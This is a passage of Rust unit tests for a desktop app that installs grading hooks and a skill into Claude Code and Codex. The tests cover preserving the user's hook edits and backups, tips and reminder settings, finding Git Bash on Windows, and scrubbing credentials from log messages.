                .unwrap()
                .iter()
                .flat_map(|g| g["hooks"].as_array().unwrap().clone())
                .find(|h| h["command"].as_str().is_some_and(|c| c.contains(HOOK_MARK)))
                .unwrap()
        };
        assert_eq!(ours(&after)["command"], hook_command(&lab.env, arg), "{event}: this app's command");
        assert_eq!(ours(&after)["timeout"], 99, "{event}: nothing but the command is changed");
        assert_eq!(ours(&after)["statusMessage"], "Grading");
        assert_eq!(ours(&before)["statusMessage"], "Grading");
    }
    // Everything of theirs is exactly where it was.
    for key in ["zeta", "alpha"] {
        assert_eq!(after[key], before[key]);
    }
    assert_eq!(after["hooks"]["PreToolUse"], before["hooks"]["PreToolUse"]);
    assert_eq!(after["hooks"]["SessionStart"], before["hooks"]["SessionStart"]);
    assert_eq!(after["hooks"]["Stop"][0], before["hooks"]["Stop"][0]);
    // The hooks file was copied first, as for any change to it, and the copy is the file as it was.
    let backups = lab.backups();
    assert_eq!(backups.len(), backups_before + 1);
    let copy: serde_json::Value = serde_json::from_str(&backups.last().unwrap().1).unwrap();
    assert_eq!(copy, before);
    assert!(status(&lab.env, &[], None).codex.on);
}

#[test]
fn a_second_launch_with_nothing_new_rewrites_nothing() {
    let lab = Lab::new();
    codex_from_an_older_app(&lab);
    assert_eq!(refresh(&lab.env), Ok(true));
    let files =
        || ["SKILL.md", "scripts/na"].map(|f| fs::metadata(lab.skill_dir().join(f)).unwrap().modified().unwrap());
    let (hooks, modified, backups) = (fs::read_to_string(lab.hooks()).unwrap(), files(), lab.backups().len());
    assert_eq!(refresh(&lab.env), Ok(false));
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), hooks);
    assert_eq!(files(), modified, "not even written again");
    assert_eq!(lab.backups().len(), backups, "and no new copy of the hooks file");
}

#[test]
fn hooks_whose_commands_are_already_right_are_left_as_the_person_has_them() {
    let lab = Lab::new();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    // Their own edit to ours that isn't the command: a longer timeout, written in their style.
    let edited = fs::read_to_string(lab.hooks()).unwrap().replace("\"timeout\": 10", "\"timeout\": 30");
    assert!(edited.contains("\"timeout\": 30"));
    fs::write(lab.hooks(), &edited).unwrap();
    let backups = lab.backups().len();
    assert_eq!(refresh(&lab.env), Ok(false));
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), edited);
    assert_eq!(lab.backups().len(), backups);
}

#[test]
fn only_the_skill_is_rewritten_when_only_the_skill_is_old() {
    let lab = Lab::new();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let skill = lab.skill_dir().join("SKILL.md");
    fs::write(&skill, format!("{}\nOlder.\n", fs::read_to_string(&skill).unwrap())).unwrap();
    let hooks = fs::read_to_string(lab.hooks()).unwrap();
    assert_eq!(refresh(&lab.env), Ok(true));
    assert_eq!(fs::read_to_string(&skill).unwrap(), codex_skill(SKILL_FILE).unwrap());
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), hooks);
    assert!(lab.backups().is_empty(), "the hooks file wasn't changed, so it wasn't copied");
}

#[test]
fn a_skill_that_is_not_ours_means_nothing_of_ours_is_there_and_nothing_is_touched() {
    let lab = Lab::new();
    // Nothing on: no folders made.
    let before = lab.tree();
    assert_eq!(refresh(&lab.env), Ok(false));
    assert_eq!(lab.tree(), before);
    // Their own grade-me, next to a shim and hooks that look like ours.
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let hooks = fs::read_to_string(lab.hooks()).unwrap();
    let older_hooks = hooks.replace(&lab.env.home.to_string_lossy().into_owned(), "/Users/older");
    fs::write(lab.hooks(), &older_hooks).unwrap();
    let skill = lab.skill_dir().join("SKILL.md");
    let shim = lab.skill_dir().join("scripts/na");
    fs::write(&shim, "their shim").unwrap();
    let backups = lab.backups().len();
    for theirs in ["mine", "---\nname: grade-me\n---\nTheir own grade-me.\n", ""] {
        fs::write(&skill, theirs).unwrap();
        assert_eq!(refresh(&lab.env), Ok(false), "{theirs:?}");
        assert_eq!(fs::read_to_string(&skill).unwrap(), theirs);
        assert_eq!(fs::read_to_string(&shim).unwrap(), "their shim");
        assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), older_hooks);
    }
    // A skill that can't even be read as text isn't ours either.
    fs::write(&skill, [0xff, 0xfe, 0x00]).unwrap();
    assert_eq!(refresh(&lab.env), Ok(false));
    assert_eq!(fs::read(&skill).unwrap(), [0xff, 0xfe, 0x00]);
    assert_eq!(lab.backups().len(), backups);
    // Turned off, and there is no skill at all: still nothing to do.
    fs::remove_file(&skill).unwrap();
    assert_eq!(refresh(&lab.env), Ok(false));
}

#[test]
fn an_app_update_does_not_bring_back_a_hook_the_person_took_out() {
    let lab = Lab::new();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let mut hooks: serde_json::Value = serde_json::from_str(&fs::read_to_string(lab.hooks()).unwrap()).unwrap();
    hooks["hooks"].as_object_mut().unwrap().remove("Stop");
    fs::write(lab.hooks(), pretty(&hooks)).unwrap();
    fs::remove_file(lab.skill_dir().join("scripts/na")).unwrap();
    let skill = lab.skill_dir().join("SKILL.md");
    fs::write(&skill, format!("{}\nOlder.\n", fs::read_to_string(&skill).unwrap())).unwrap();
    assert_eq!(refresh(&lab.env), Ok(true));
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), pretty(&hooks), "their file, as they left it");
    assert_eq!(lab.backups().len(), 0, "the hooks file was not changed, so it was not copied");
    assert_eq!(fs::read_to_string(&skill).unwrap(), codex_skill(SKILL_FILE).unwrap());
    assert_eq!(
        fs::read_to_string(lab.skill_dir().join("scripts/na")).unwrap(),
        lf(SHIM_FILE),
        "the shim is ours, so it is made again"
    );
}

#[test]
fn a_hooks_file_that_cannot_be_read_is_left_alone_but_the_skill_still_gets_updated() {
    let lab = Lab::new();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let skill = lab.skill_dir().join("SKILL.md");
    fs::write(&skill, format!("{}\nOlder.\n", fs::read_to_string(&skill).unwrap())).unwrap();
    fs::write(lab.hooks(), "{ not json").unwrap();
    assert_eq!(
        refresh(&lab.env).unwrap_err(),
        "Couldn't read your Codex hooks file (~/.codex/hooks.json). Fix it, then try again."
    );
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), "{ not json");
    assert_eq!(lab.backups().len(), 0, "the hooks file was not changed, so it was not copied");
    assert_eq!(fs::read_to_string(&skill).unwrap(), codex_skill(SKILL_FILE).unwrap());
    // A hooks file that is JSON but isn't a hooks file is the same.
    fs::write(lab.hooks(), r#"{"hooks": []}"#).unwrap();
    assert!(refresh(&lab.env).is_err());
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), r#"{"hooks": []}"#);
}

#[cfg(unix)]
#[test]
fn what_an_app_update_writes_is_written_like_a_fresh_turn_on() {
    use std::os::unix::fs::PermissionsExt;
    let lab = Lab::new();
    codex_from_an_older_app(&lab);
    let mode = |f: &str| fs::metadata(lab.skill_dir().join(f)).unwrap().permissions().mode() & 0o777;
    fs::set_permissions(lab.skill_dir().join("scripts/na"), fs::Permissions::from_mode(0o600)).unwrap();
    assert_eq!(refresh(&lab.env), Ok(true));
    assert_eq!((mode("SKILL.md"), mode("scripts/na")), (0o644, 0o755));
    let names: Vec<_> =
        fs::read_dir(lab.skill_dir().join("scripts")).unwrap().flatten().map(|e| e.file_name()).collect();
    assert_eq!(names, ["na"], "written through a temporary file that is gone");
}

fn day(text: &str) -> NaiveDate {
    text.parse().unwrap()
}

#[test]
fn the_latest_card_is_per_tool() {
    let lab = Lab::with_claude();
    let last: Vec<(String, NaiveDate)> = [
        ("claude-code", "2026-10-28"),
        ("codex", "2026-10-20"),
        ("claude-cowork", "2026-10-29"),
        ("chatgpt-export", "2026-11-01"),
    ]
    .iter()
    .map(|(s, d)| ((*s).to_string(), day(d)))
    .collect();
    let s = status(&lab.env, &last, None);
    assert_eq!(s.claude_code.last_card_day.as_deref(), Some("2026-10-28"), "Cowork can't carry a card");
    assert_eq!(s.codex.last_card_day.as_deref(), Some("2026-10-20"));
    assert_eq!(status(&lab.env, &[], None).claude_code.last_card_day, None);
}

#[test]
fn each_tool_is_a_source_that_can_carry_a_report_card_and_each_such_source_has_a_tool() {
    let all = sources::all();
    for tool in [Tool::ClaudeCode, Tool::Codex] {
        let source = all.iter().find(|s| s.id() == tool.source()).expect("the tool's source exists");
        assert!(source.gradable(), "{}", tool.name());
    }
    let gradable: Vec<_> = all.iter().filter(|s| s.gradable()).map(|s| s.id()).collect();
    assert_eq!(gradable, [Tool::ClaudeCode.source(), Tool::Codex.source()], "a new one needs a row in Settings");
    assert!(!all.iter().find(|s| s.id() == "claude-cowork").unwrap().gradable());
}

#[test]
fn a_run_from_a_temporary_copy_is_flagged_for_settings() {
    let mut lab = Lab::new();
    assert!(!status(&lab.env, &[], None).translocated, "no executable known");
    lab.env.exe = Some("/Applications/No, Actually....app/Contents/MacOS/noactually-app".into());
    assert!(!status(&lab.env, &[], None).translocated);
    lab.env.exe = Some("/private/var/folders/ab/T/AppTranslocation/3F2A/d/No, Actually....app/Contents/MacOS/x".into());
    assert!(status(&lab.env, &[], None).translocated);
}

#[test]
fn a_tool_that_is_not_installed_is_never_on() {
    let lab = Lab::new();
    let s = status(&lab.env, &[], None);
    assert!(!s.claude_code.installed_tool && !s.claude_code.on);
    assert!(s.codex.installed_tool && !s.codex.on);
}

#[test]
fn tips_are_a_file_next_to_the_database() {
    let lab = Lab::new();
    let file = lab.env.data.join(cli::TIPS_FILE);
    assert!(!status(&lab.env, &[], None).tips);
    set_tips(&lab.env, true).unwrap();
    assert!(file.is_file() && status(&lab.env, &[], None).tips);
    set_tips(&lab.env, true).unwrap();
    set_tips(&lab.env, false).unwrap();
    assert!(!file.exists() && !status(&lab.env, &[], None).tips);
    set_tips(&lab.env, false).unwrap();
    // The data folder may not exist yet on a first run.
    let mut fresh = Lab::new();
    fresh.env.data = fresh.env.data.join("not/yet");
    set_tips(&fresh.env, true).unwrap();
    assert!(fresh.env.data.join(cli::TIPS_FILE).is_file());
}

#[test]
fn tips_since_is_the_day_they_went_on_only_while_claude_code_is_on() {
    let lab = Lab::new();
    let shown = |on: bool| {
        let s = status(&lab.env, &[], None);
        Status { claude_code: ToolStatus { on, ..s.claude_code }, ..s }
    };
    assert_eq!(tips_since(&lab.env, &shown(true)), None, "tips are off");
    set_tips(&lab.env, true).unwrap();
    assert_eq!(tips_since(&lab.env, &shown(true)), Some(Local::now().date_naive()));
    assert_eq!(tips_since(&lab.env, &shown(false)), None, "the hook isn't there to give the rules");
}

#[test]
fn turning_tips_off_leaves_word_for_chats_that_have_the_rules() {
    let lab = Lab::new();
    let off = lab.env.data.join(cli::TIPS_OFF_FILE);
    set_tips(&lab.env, false).unwrap();
    assert!(!off.exists(), "they were never on");
    set_tips(&lab.env, true).unwrap();
    set_tips(&lab.env, false).unwrap();
    assert!(off.is_file());
    set_tips(&lab.env, false).unwrap();
    assert!(off.is_file(), "still there on a second click");
    set_tips(&lab.env, true).unwrap();
    assert!(!off.exists(), "on again takes it back");
}

#[test]
fn turning_tips_on_never_empties_a_file_that_is_there() {
    let lab = Lab::new();
    let file = lab.env.data.join(cli::TIPS_FILE);
    fs::write(&file, "kept").unwrap();
    set_tips(&lab.env, true).unwrap();
    assert_eq!(fs::read_to_string(&file).unwrap(), "kept");
}

#[cfg(unix)]
#[test]
fn a_link_where_a_marker_goes_is_left_as_it_is() {
    let lab = Lab::new();
    let (file, elsewhere) = (lab.env.data.join(cli::TIPS_FILE), lab.dir.path().join("elsewhere"));
    fs::write(&elsewhere, "theirs").unwrap();
    std::os::unix::fs::symlink(&elsewhere, &file).unwrap();
    set_tips(&lab.env, true).unwrap();
    assert_eq!(fs::read_to_string(&elsewhere).unwrap(), "theirs", "not written through");
    assert!(fs::symlink_metadata(&file).unwrap().file_type().is_symlink());
}

#[test]
fn reminders_are_on_until_a_file_beside_the_database_turns_them_off() {
    let lab = Lab::new();
    let file = lab.env.data.join(cli::QUIET_FILE);
    assert!(status(&lab.env, &[], None).reminders);
    set_reminders(&lab.env, false).unwrap();
    assert!(file.is_file() && !status(&lab.env, &[], None).reminders);
    fs::write(&file, "kept").unwrap();
    set_reminders(&lab.env, false).unwrap();
    assert_eq!(fs::read_to_string(&file).unwrap(), "kept", "not emptied");
    set_reminders(&lab.env, true).unwrap();
    assert!(!file.exists() && status(&lab.env, &[], None).reminders);
    set_reminders(&lab.env, true).unwrap();
    // Turning reminders off leaves tips as they were.
    set_tips(&lab.env, true).unwrap();
    set_reminders(&lab.env, false).unwrap();
    assert!(status(&lab.env, &[], None).tips);
    // The data folder may not exist yet on a first run.
    let mut fresh = Lab::new();
    fresh.env.data = fresh.env.data.join("not/yet");
    set_reminders(&fresh.env, false).unwrap();
    assert!(fresh.env.data.join(cli::QUIET_FILE).is_file());
    fresh.env.data = fresh.dir.path().join("a-file");
    fs::write(&fresh.env.data, "x").unwrap();
    fresh.env.data = fresh.env.data.join("inside");
    assert_eq!(set_reminders(&fresh.env, false).unwrap_err(), "Couldn't turn that off. Try again.");
}

#[test]
fn tips_failures_are_plain() {
    let mut lab = Lab::new();
    let blocker = lab.dir.path().join("a-file");
    fs::write(&blocker, "x").unwrap();
    lab.env.data = blocker.join("inside");
    assert_eq!(set_tips(&lab.env, true).unwrap_err(), "Couldn't turn that on. Try again.");
}

#[test]
fn the_window_gets_the_shape_it_expects() {
    let lab = Lab::with_claude();
    lab.fake("plugins.json", r#"[{"id":"grade@noactually"}]"#);
    let json = serde_json::to_value(status(&lab.env, &[("claude-code".into(), day("2026-10-29"))], None)).unwrap();
    assert_eq!(
        json,
        serde_json::json!({
            "claude_code": {
                "installed_tool": true, "on": true, "last_card_day": "2026-10-29", "problem": null, "left_out": 0,
                "unavailable": null
            },
            "codex": {
                "installed_tool": true, "on": false, "last_card_day": null, "problem": null, "left_out": 0,
                "unavailable": null
            },
            "tips": false,
            "tip_activity": {"active": 0, "tips": 0, "blocked": false},
            "reminders": true,
            "translocated": false,
        })
    );
    assert_eq!(serde_json::from_str::<Tool>("\"claude_code\"").unwrap(), Tool::ClaudeCode);
    assert_eq!(serde_json::from_str::<Tool>("\"codex\"").unwrap(), Tool::Codex);
    assert!(serde_json::from_str::<Tool>("\"chatgpt\"").is_err());
}

// ---- Windows ----

use super::platform::{git_bash, CODEX_NOT_YET, NEEDS_GIT};

fn windows(lab: &mut Lab, git: Option<&str>) {
    lab.env.windows = true;
    lab.env.git_bash = git.map(PathBuf::from);
}

#[test]
fn git_bash_is_the_file_claude_code_is_told_about_else_the_one_beside_git_else_one_of_the_usual_places() {
    // A pretend disk that has exactly these files.
    let at = |places: &[&str]| {
        let places: Vec<PathBuf> = places.iter().map(PathBuf::from).collect();
        move |p: &Path| places.iter().any(|x| x == p)
    };
    let (pf, pf86) = (r"C:\Program Files\Git\bin\bash.exe", r"C:\Program Files (x86)\Git\bin\bash.exe");
    let local = || Some(PathBuf::from(r"C:\Users\me\AppData\Local"));
    let mine = Path::new(r"C:\Users\me\AppData\Local").join("Programs").join("Git").join("bin").join("bash.exe");
    let mine_str = mine.to_str().unwrap();
    // Git installed somewhere else: `git.exe` is on PATH, and `bash.exe` is in the folder beside its own.
    let root = Path::new("D:").join("tools").join("Git");
    let (git, git_bash_file) = (root.join("cmd").join("git.exe"), root.join("bin").join("bash.exe"));
    let there = git_bash_file.to_str().unwrap();

    assert_eq!(git_bash(None, None, None, &at(&[])), None, "nowhere");
    assert_eq!(git_bash(None, None, local(), &at(&[pf])), Some(pf.into()));
    assert_eq!(git_bash(None, None, local(), &at(&[pf86])), Some(pf86.into()));
    assert_eq!(git_bash(None, None, local(), &at(&[mine_str])), Some(mine.clone()));
    assert_eq!(git_bash(None, None, None, &at(&[mine_str])), None, "no per-person folder to look in");
    // The variable wins, but only for a file that is there.
    let custom = r"D:\tools\git\bin\bash.exe";
    assert_eq!(git_bash(Some(custom.into()), None, local(), &at(&[custom, pf])), Some(custom.into()));
    assert_eq!(git_bash(Some(custom.into()), None, local(), &at(&[pf])), Some(pf.into()), "a stale setting");
    assert_eq!(git_bash(Some("".into()), None, local(), &at(&[pf])), Some(pf.into()), "an empty one");

    // The `git.exe` on PATH: its bash is found where no usual place has one, and before the usual places.
    assert_eq!(git_bash(None, Some(git.clone()), local(), &at(&[there])), Some(git_bash_file.clone()));
    assert_eq!(git_bash(None, Some(git.clone()), None, &at(&[there, pf])), Some(git_bash_file.clone()), "first");
    assert_eq!(git_bash(Some(custom.into()), Some(git.clone()), None, &at(&[custom, there])), Some(custom.into()));
    assert_eq!(git_bash(None, Some(git.clone()), local(), &at(&[pf])), Some(pf.into()), "no bash beside it");
    assert_eq!(git_bash(None, Some(git.clone()), None, &at(&[])), None);
    // `git.exe` in the `bin` folder is beside the same bash.
    let in_bin = root.join("bin").join("git.exe");
    assert_eq!(git_bash(None, Some(in_bin), None, &at(&[there])), Some(git_bash_file));
    // A `git.exe` with no folder around it has nothing beside it.
    assert_eq!(git_bash(None, Some("git.exe".into()), None, &at(&[])), None);
}

#[test]
fn on_windows_claude_code_needs_git_and_says_so_instead_of_turning_on() {
    let mut lab = Lab::with_claude();
    windows(&mut lab, None);
    let shown = status(&lab.env, &[], None);
    assert_eq!(shown.claude_code.unavailable.as_deref(), Some(NEEDS_GIT));
    assert_eq!(
        NEEDS_GIT,
        "Report cards need Git for Windows, which Claude Code uses to run commands. Install it, or set CLAUDE_CODE_GIT_BASH_PATH, then try again."
    );
    assert_eq!(turn_on(&lab.env, Tool::ClaudeCode, SOURCE).unwrap_err(), NEEDS_GIT);
    assert!(!changed_anything(&lab), "nothing was added to Claude Code: {:?}", lab.calls());
    // Turning off is never held back, and neither is a plugin that is on already.
    turn_off(&lab.env, Tool::ClaudeCode).unwrap();

    windows(&mut lab, Some(r"C:\Program Files\Git\bin\bash.exe"));
    assert_eq!(status(&lab.env, &[], None).claude_code.unavailable, None);
    turn_on(&lab.env, Tool::ClaudeCode, SOURCE).unwrap();
    assert!(lab.calls().iter().any(|c| c == ADD));
}

#[test]
fn on_windows_codex_is_not_available_yet() {
    let mut lab = Lab::new();
    windows(&mut lab, Some(r"C:\Program Files\Git\bin\bash.exe"));
    let shown = status(&lab.env, &[], None);
    assert_eq!(shown.codex.unavailable.as_deref(), Some(CODEX_NOT_YET));
    assert_eq!(CODEX_NOT_YET, "Report cards for Codex aren't available on Windows yet.");
    let before = lab.tree();
    assert_eq!(turn_on(&lab.env, Tool::Codex, SOURCE).unwrap_err(), CODEX_NOT_YET);
    assert_eq!(lab.tree(), before, "no skill or hook written");
    assert!(!lab.hooks().exists());
}

#[test]
fn off_windows_nothing_is_unavailable() {
    let mut lab = Lab::with_claude();
    let shown = status(&lab.env, &[], None);
    assert_eq!((shown.claude_code.unavailable, shown.codex.unavailable), (None, None));
    // Git is not asked about on other systems, whatever was found.
    lab.env.git_bash = None;
    assert_eq!(status(&lab.env, &[], None).claude_code.unavailable, None);
    turn_on(&lab.env, Tool::Codex, SOURCE).unwrap();
}

// ---- who may do what ----

#[test]
fn turning_on_needs_the_tools_source_allowed_first() {
    assert!(require_source(Tool::ClaudeCode, true).is_ok());
    assert_eq!(
        require_source(Tool::ClaudeCode, false).unwrap_err(),
        "Allow Claude Code in Sources first, so the app can read your report cards."
    );
    assert_eq!(
        require_source(Tool::Codex, false).unwrap_err(),
        "Allow Codex in Sources first, so the app can read your report cards."
    );
    // Cowork is another source and doesn't count for Claude Code.
    assert_eq!(Tool::ClaudeCode.source(), "claude-code");
    assert_eq!(Tool::Codex.source(), "codex");
}

#[test]
fn only_the_main_window_may_change_report_cards() {
    assert!(only_main("main").is_ok());
    assert!(only_main("glance").is_err());
    assert!(only_main("").is_err());
}

// ---- what goes in the log ----

#[test]
fn the_log_gets_a_short_piece_with_no_passwords_in_it() {
    assert_eq!(for_log("  hello \n"), "hello");
    let long = "x".repeat(5000);
    let cut = for_log(&long);
    assert!(cut.len() < 1100 && cut.starts_with("xxxx") && cut.contains("more bytes"), "{}", cut.len());
    // A cut never lands inside a character.
    let wide = "é".repeat(2000);
    assert!(for_log(&wide).starts_with("éé"));
    assert_eq!(
        for_log("fatal: unable to access 'https://ann:s3cret@github.com/HTMLGuyLLC/NoActually/': 403"),
        "fatal: unable to access 'https://github.com/HTMLGuyLLC/NoActually/': 403"
    );
    assert_eq!(
        for_log("git clone ssh://git:tok@h.example:22/x and http://u@a.b/c?d=1"),
        "git clone ssh://h.example:22/x and http://a.b/c?d=1"
    );
    assert_eq!(for_log("https://github.com/x/y and no creds"), "https://github.com/x/y and no creds");
    assert_eq!(for_log("see mail@example.com"), "see mail@example.com", "an address isn't a link");
    // Credentials past the cut are gone too: the text is cleaned first.
    let late = format!("{}https://u:p@h.example/x", "y".repeat(1000));
    assert!(!for_log(&late).contains("u:p"));
    let said = Ran { ok: false, timed_out: false, out: String::new(), err: "https://bob:hunter2@github.com/x".into() };
    assert!(!for_log(&said.err).contains("hunter2"));
}

#[test]
fn a_button_press_finds_a_newer_install_over_an_older_saved_one() {
    let tmp = tempfile::tempdir().unwrap();
    let data = tmp.path().join("data");
    let old = program(&tmp.path().join("old-node/bin"), "claude");
    assert_eq!(
        find_claude(&data, &Mutex::new(Vec::new()), &[tmp.path().join("old-node/bin")], &never, true),
        Some(old.clone())
    );
    // The person installs a current Claude Code somewhere the usual places cover, and presses Look again.
    let new = program(&tmp.path().join("local-bin"), "claude");
    let dirs = [tmp.path().join("local-bin"), tmp.path().join("old-node/bin")];
    assert_eq!(find_claude(&data, &Mutex::new(Vec::new()), &dirs, &never, true), Some(new.clone()));
    assert_eq!(finding::saved(&data), Some(new), "and that's what launches use from now on");
}

#[test]
fn the_login_shells_claude_beats_the_desktop_apps_copy() {
    let (home, files) =
        home_with_claude_at(&["Library/Application Support/Claude/claude-code/2.1.0/abc/claude.app/Contents/MacOS"]);
    let dirs = dirs_for(home.path(), false, true);
    let shell = |_: &str| Some(PathBuf::from("/from/the/shell/claude"));
    assert_eq!(find_exe_in("claude", &dirs, &[], &shell), Some(PathBuf::from("/from/the/shell/claude")));
    assert_eq!(
        find_exe_in("claude", &dirs, &[], &never),
        Some(files[0].clone()),
        "the desktop app's copy is the last resort"
    );
}
